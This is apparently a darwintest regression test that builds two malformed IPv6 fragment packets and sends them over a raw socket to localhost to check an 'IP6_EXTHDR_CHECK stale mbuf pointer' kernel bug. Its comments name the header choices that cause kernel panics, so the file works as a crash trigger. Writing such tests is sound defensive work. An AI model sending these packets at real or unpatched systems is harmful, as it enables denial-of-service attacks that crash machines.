#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if_var.h>
#include <netinet/ip6.h>
#include <darwintest.h>

struct packet1 {
	struct ip6_hbh hbh;
	struct ip6_opt hbh_opt;
	uint8_t hbh_pad[4];
	struct ip6_frag frag;
	struct ip6_dest dest;
	struct ip6_opt dest_opt;
	uint8_t dest_pad[4];
};

struct packet2 {
	struct ip6_hbh hbh;
	struct ip6_opt hbh_opt;
	uint8_t hbh_pad[4];
	struct ip6_frag frag;
	struct ip6_opt dest_opt;
	uint8_t dest_pad[6];
	uint8_t payload[16];
};

T_DECL(IP6_EXTHDR_CHECK_ICMPV6_61873584, "ICMPv6 test for IP6_EXTHDR_CHECK stale mbuf pointer vulnerability", T_META("as_root", "true"))
{
	struct sockaddr_in6 daddr;
	struct packet1 packet1;
	struct packet2 packet2;
	int s, id, res;

	srand(time(NULL));
	id = rand();

	T_SETUPBEGIN;
	T_ASSERT_POSIX_SUCCESS(s = socket(AF_INET6, SOCK_RAW, IPPROTO_HOPOPTS), NULL);
	T_SETUPEND;

	memset(&daddr, 0, sizeof(daddr));
	daddr.sin6_family = AF_INET6;
	daddr.sin6_port = 0;
	inet_pton(AF_INET6, "::1", &daddr.sin6_addr);

	memset(&packet1, 'A', sizeof(struct packet1));
	packet1.hbh.ip6h_nxt = IPPROTO_FRAGMENT;
	packet1.hbh.ip6h_len = 0;
	packet1.hbh_opt.ip6o_type = IP6OPT_PADN;
	packet1.hbh_opt.ip6o_len = 4;
	packet1.frag.ip6f_nxt = IPPROTO_DSTOPTS;
	packet1.frag.ip6f_reserved = 0;
	packet1.frag.ip6f_offlg = htons(0) | IP6F_MORE_FRAG;
	packet1.frag.ip6f_ident = id;
	// Use IPPROTO_RAW for "assertion failed: m->m_flags & M_PKTHDR" panic
	// Use IPPROTO_ICMPV6 for "m_free: freeing an already freed mbuf" panic
	packet1.dest.ip6d_nxt = IPPROTO_RAW;
	packet1.dest.ip6d_len = 1;
	packet1.dest_opt.ip6o_type = IP6OPT_PADN;
	packet1.dest_opt.ip6o_len = 4;

	memset(&packet2, 'B', sizeof(struct packet2));
	packet2.hbh.ip6h_nxt = IPPROTO_FRAGMENT;
	packet2.hbh.ip6h_len = 0;
	packet2.hbh_opt.ip6o_type = IP6OPT_PADN;
	packet2.hbh_opt.ip6o_len = 4;
	packet2.frag.ip6f_nxt = IPPROTO_DSTOPTS;
	packet2.frag.ip6f_reserved = 0;
	packet2.frag.ip6f_offlg = htons(8);
	packet2.frag.ip6f_ident = id;
	packet2.dest_opt.ip6o_type = IP6OPT_PADN;
	packet2.dest_opt.ip6o_len = 6;

	T_ASSERT_POSIX_SUCCESS(res = sendto(s, (char *)&packet1, sizeof(packet1), 0,
	    (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)), NULL);
	T_ASSERT_POSIX_SUCCESS(res = sendto(s, (char *)&packet2, sizeof(packet2), 0,
	    (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr)), NULL);
	T_ASSERT_POSIX_SUCCESS(res = close(s), NULL);
}
